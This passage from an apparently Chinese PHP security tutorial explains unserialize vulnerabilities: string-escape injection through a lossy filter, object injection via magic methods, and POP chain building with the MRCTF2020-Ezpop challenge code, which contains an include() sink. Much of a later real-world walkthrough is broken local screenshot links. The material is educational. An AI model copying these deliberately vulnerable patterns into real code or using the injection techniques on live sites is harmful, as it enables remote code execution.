class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">change</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;xx&quot;</span>,<span class="hljs-string">&quot;x&quot;</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><span class="hljs-variable">$arr</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-variable">$arr</span>[<span class="hljs-string">&#x27;age&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;age&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;反序列化字符串：&quot;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$arr</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;过滤后:&quot;</span>;<br><span class="hljs-variable">$old</span> = <span class="hljs-title function_ invoke__">change</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$arr</span>));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$old</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-variable">$new</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$old</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$new</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br/&gt;此时，age=&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$new</span>[<span class="hljs-string">&#x27;age&#x27;</span>];<br></code></pre></td></tr></table></figure><p>正常情况传入<code>name=mao&amp;age=11</code>的结果</p><p><img src="https://img-blog.csdnimg.cn/20210203104859195.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbGl0dWRp,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"> </p><p>老规矩看看最后构造的结果，再继续讲解</p><p><img src="https://img-blog.csdnimg.cn/20210203104905443.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbGl0dWRp,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"> </p><p>简单来说，就是前面少了一半，导致后面的字符被吃掉，从而执行了我们后面的代码；<br>我们来看，这部分是age序列化后的结果</p><p><code>s:3:&quot;age&quot;;s:28:&quot;11&quot;;s:3:&quot;age&quot;;s:6:&quot;woaini&quot;;&#125;&quot;</code></p><p>由于前面是40个x所以导致少了20个字符，所以需要后面来补上，<code>&quot;;s:3:&quot;age&quot;;s:28:&quot;11</code>这一部分刚好20个，后面由于有<code>&quot;</code>闭合了前面因此后面的参数就可以由我们自定义执行了</p><h2 id="对象注入"><a href="#对象注入" class="headerlink" title="对象注入"></a>对象注入</h2><p>当用户的请求在传给反序列化函数<code>unserialize()</code>之前没有被正确的过滤时就会产生漏洞。因为PHP允许对象序列化，攻击者就可以提交特定的序列化的字符串给一个具有该漏洞的<code>unserialize</code>函数，最终导致一个在该应用范围内的任意PHP对象注入。</p><p><strong>对象漏洞</strong>出现得满足两个前提</p><blockquote><p>1、<code>unserialize</code>的参数可控。<br>2、 代码里有定义一个含有魔术方法的类，并且该方法里出现一些使用类成员变量作为参数的存在安全问题的函数。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//比如这个例子</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$test</span> = <span class="hljs-string">&quot;y4mao&quot;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;test;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:5:&quot;maomi&quot;;&#125;&#x27;</span>;<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>在脚本运行结束后便会调用<code>_destruct</code>函数，同时会覆盖test变量输出<code>maomi</code></p><h2 id="POP链的构造利用"><a href="#POP链的构造利用" class="headerlink" title="POP链的构造利用"></a>POP链的构造利用</h2><h3 id="POP链简单介绍"><a href="#POP链简单介绍" class="headerlink" title="POP链简单介绍"></a>POP链简单介绍</h3><p>前面所讲解的序列化攻击更多的是魔术方法中出现一些利用的漏洞，因为自动调用而触发漏洞，但如果关键代码不在魔术方法中，而是在一个类的普通方法中。这时候可以通过寻找相同的函数名将类的属性和敏感函数的属性联系起来</p><h3 id="简单案例讲解"><a href="#简单案例讲解" class="headerlink" title="简单案例讲解"></a>简单案例讲解</h3><p>首先看看简单的MRCTF2020-Ezpop</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;index.php&#x27;</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Welcome to &#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;source.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;str-&gt;source;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;p = <span class="hljs-keyword">array</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;p;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br><br>&#125;<br><br><br></code></pre></td></tr></table></figure><h2 id="使用详情"><a href="#使用详情" class="headerlink" title="使用详情"></a>使用详情</h2><h3 id="例题一"><a href="#例题一" class="headerlink" title="例题一"></a>例题一</h3><p><img src="C:\Users\10143\AppData\Roaming\Typora\typora-user-images\image-20220324202237488.png" alt="image-20220324202237488"> </p><p><img src="C:\Users\10143\AppData\Roaming\Typora\typora-user-images\image-20220324202314464.png" alt="image-20220324202314464"> </p><p><img src="C:\Users\10143\AppData\Roaming\Typora\typora-user-images\image-20220324202351819.png" alt="image-20220324202351819"> </p><p><img src="C:\Users\10143\AppData\Roaming\Typora\typora-user-images\image-20220324202510705.png" alt="image-20220324202510705"> </p><h3 id="例题二"><a href="#例题二" class="headerlink" title="例题二"></a>例题二</h3><p><img src="C:\Users\10143\AppData\Roaming\Typora\typora-user-images\image-20220324202655131.png" alt="image-20220324202655131"> </p><p><img src="C:\Users\10143\AppData\Roaming\Typora\typora-user-images\image-20220324202741131.png" alt="image-20220324202741131"> </p><p><img src="C:\Users\10143\AppData\Roaming\Typora\typora-user-images\image-20220324202803652.png" alt="image-20220324202803652"> </p><p>找一个可控变量</p><h3 id="一个实战实例"><a href="#一个实战实例" class="headerlink" title="一个实战实例"></a>一个实战实例</h3><p><img src="C:\Users\10143\AppData\Roaming\Typora\typora-user-images\image-20220324203543379.png" alt="image-20220324203543379"> </p><p><img src="C:\Users\10143\AppData\Roaming\Typora\typora-user-images\image-20220324203616257.png" alt="image-20220324203616257"> </p><p>看到有实例化类，那么在实例化类中我们应该寻找试着寻找有没有可控函数</p><p><img src="C:\Users\10143\AppData\Roaming\Typora\typora-user-images\image-20220324204045761.png" alt="image-20220324204045761">  </p><p>发现没有可以触发的危险函数，所以在想可不可以通过它去触发其他带有的危险函数</p><p>又发现他又拼接的过程，所以就考虑红色标注处有没有可能触发_tostring函数</p><p><img src="C:\Users\10143\AppData\Roaming\Typora\typora-user-images\image-20220324204131945.png" alt="image-20220324204131945"> </p><p>遍历代码发现没有可以直接利用的危险函数</p><p><img src="C:\Users\10143\AppData\Roaming\Typora\typora-user-images\image-20220324204420900.png" alt="image-20220324204420900"> </p><p><img src="C:\Users\10143\AppData\Roaming\Typora\typora-user-images\image-20220324204436886.png" alt="image-20220324204436886"> </p><p>所以要看这两个参数是否可控，如果不可控就不是可以直接利用的漏洞</p><p><img src="C:\Users\10143\AppData\Roaming\Typora\typora-user-images\image-20220324203500092.png" alt="image-20220324203500092"> </p><p><img src="C:\Users\10143\AppData\Roaming\Typora\typora-user-images\image-20220324204637309.png" alt="image-20220324204637309"> </p><p><img src="C:\Users\10143\AppData\Roaming\Typora\typora-user-images\image-20220324204749913.png" alt="image-20220324204749913"> </p><p><img src="C:\Users\10143\AppData\Roaming\Typora\typora-user-images\image-20220324204918681.png" alt="image-20220324204918681"> </p><p><img src="C:\Users\10143\AppData\Roaming\Typora\typora-user-images\image-20220324204941126.png" alt="image-20220324204941126"> </p><img src="C:\Users\10143\AppData\Roaming\Typora\typora-user-images\image-20220324205139956.png" alt="image-20220324205139956" style="zoom:80%;" /><p><img src="C:\Users\10143\AppData\Roaming\Typora\typora-user-images\image-20220324205205017.png" alt="image-20220324205205017"> </p><p>通过cookie或者post都可以传入</p><p><img src="C:\Users\10143\AppData\Roaming\Typora\typora-user-images\image-20220324210105508.png" alt="image-20220324210105508"> </p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
